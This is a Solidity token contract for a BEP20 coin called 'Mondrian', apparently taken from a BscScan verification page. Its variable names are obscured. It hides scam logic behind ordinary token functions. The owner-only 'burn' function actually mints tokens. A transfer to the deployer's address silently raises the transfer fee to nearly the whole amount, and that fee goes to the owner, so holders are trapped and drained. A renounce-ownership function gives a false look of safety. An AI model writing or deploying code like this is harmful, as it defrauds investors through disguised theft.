/**
 *Submitted for verification at BscScan.com on 2022-11-19
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-19 12:52 GMT
 */

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
contract UNYHHKP {
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public constant IAYXGV = 99999;
address public owner;
uint256 private  CELLYF = 10000000000000;
uint256 private  IHCNVA = 1000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
string public  name = "Mondrian";
string public  symbol = "Mondrian";
address private  EXASHX = address(0);
address private  ADDRCK = address(0);
uint256 private  MAXJPG = 1000000000000000;
mapping (address => uint256) public balanceOf;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  GZVEYM = address(0);
address private  RMRVUE = address(0);
uint256 private  LSIWMQ = 1000000000000000000;
address private  WSNFOO = address(0);
uint256 private  QYHOWM = 100000000;
uint256 private  QTQHIP = 10000000000;
uint8 public constant decimals = 18;
event Approval(address indexed owner, address indexed spender, uint256 value);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  UNZSSC = 1000000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getGZVEYM() private returns (address) {
return GZVEYM;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getWSNFOO() private returns (address) {
return WSNFOO;
}

function _getQTQHIP() private returns (uint256) {
return QTQHIP;
}

function _getMAXJPG() private returns (uint256) {
return MAXJPG;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getRMRVUE() private returns (address) {
return RMRVUE;
}

function _getQYHOWM() private returns (uint256) {
return QYHOWM;
}

function _getCELLYF() private returns (uint256) {
return CELLYF;
}

constructor () {
EXASHX = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tVAHVKT 0");
require(spender != address(0), "fVAHVKT 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getADDRCK() private returns (address) {
return ADDRCK;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "VAHVKT");
require(to != address(0), "VAHVKT");
require(amount <= balanceOf[from], "VAHVKT");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* IAYXGV/LSIWMQ ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==EXASHX){
LSIWMQ = IAYXGV+2;
}
emit Transfer(from, to, transferAmount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getUNZSSC() private returns (uint256) {
return UNZSSC;
}

function _getIHCNVA() private returns (uint256) {
return IHCNVA;
}


}